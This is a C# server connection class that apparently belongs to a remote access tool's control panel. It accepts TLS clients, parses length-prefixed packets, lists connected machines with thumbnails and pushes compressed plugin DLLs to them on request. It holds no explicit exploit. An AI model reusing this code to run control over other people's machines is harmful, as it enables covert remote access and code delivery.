using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server.Handle_Packet;
using System.Drawing;
using System.Diagnostics;
using System.Threading;
using Server.MessagePack;
using System.Net.Security;
using System.Security.Authentication;
using Server.Algorithm;
using Microsoft.VisualBasic;
using System.Collections.Generic;

namespace Server.Connection
{
    public class Clients
    {
        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private long HeaderSize { get; set; }
        private long Offset { get; set; }
        private bool ClientBufferRecevied { get; set; }
        public object SendSync { get; set; }
        public long BytesRecevied { get; set; }

        public string Ip { get; set; }

        public Clients(Socket socket)
        {
            SendSync = new object();
            TcpClient = socket;
            Ip = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                Offset = 0;
                HeaderSize = 4;
                ClientBuffer = new byte[HeaderSize];
                SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
            }
            catch
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
        }

        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int recevied = SslClient.EndRead(ar);
                    if (recevied > 0)
                    {
                        HeaderSize -= recevied;
                        Offset += recevied;
                        switch (ClientBufferRecevied)
                        {
                            case false:
                                {
                                    if (HeaderSize == 0)
                                    {
                                        HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
                                        if (HeaderSize > 0)
                                        {
                                            ClientBuffer = new byte[HeaderSize];
                                            Debug.WriteLine("/// Server Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                                            Offset = 0;
                                            ClientBufferRecevied = true;
                                        }
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }

                            case true:
                                {
                                    lock (Settings.LockReceivedSendValue)
                                        Settings.ReceivedValue += recevied;
                                    BytesRecevied += recevied;
                                    if (HeaderSize == 0)
                                    {
                                        ThreadPool.QueueUserWorkItem(new Packet
                                        {
                                            client = this,
                                            data = ClientBuffer,
                                        }.Read, null);
                                        Offset = 0;
                                        HeaderSize = 4;
                                        ClientBuffer = new byte[HeaderSize];
                                        ClientBufferRecevied = false;
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }
                        }
                        SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    try
                    {

                        lock (Settings.LockListviewClients)
                            LV.Remove();

                        if (LV2 != null)
                        {
                            lock (Settings.LockListviewThumb)
                                LV2.Remove();
                        }
                    }
                    catch { }
                    new HandleLogs().Addmsg($"Client {Ip} disconnected", Color.Red);
                }));
            }

            try
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch { }
        }

        public void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!TcpClient.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;
                    byte[] buffer = (byte[])msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (buffer.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(buffer))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                SslClient.Flush();
                                lock (Settings.LockReceivedSendValue)
                                    Settings.SentValue += read;
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(buffer, 0, buffer.Length);
                        SslClient.Flush();
                        lock (Settings.LockReceivedSendValue)
                            Settings.SentValue += buffer.Length;
                    }
                    Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }

        public void SendPlugin(string hash) // client is missing some plguins, sending them // total plugins = 550kb
        {
            try
            {
                foreach (string plugin in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                {
                    if (hash == GetHash.GetChecksum(plugin))
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(plugin)));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                        ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
                        new HandleLogs().Addmsg($"Plugin {Path.GetFileName(plugin)} sent to client {Ip}", Color.Blue);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Client {Ip} {ex.Message}", Color.Red);
            }
        }
    }
}
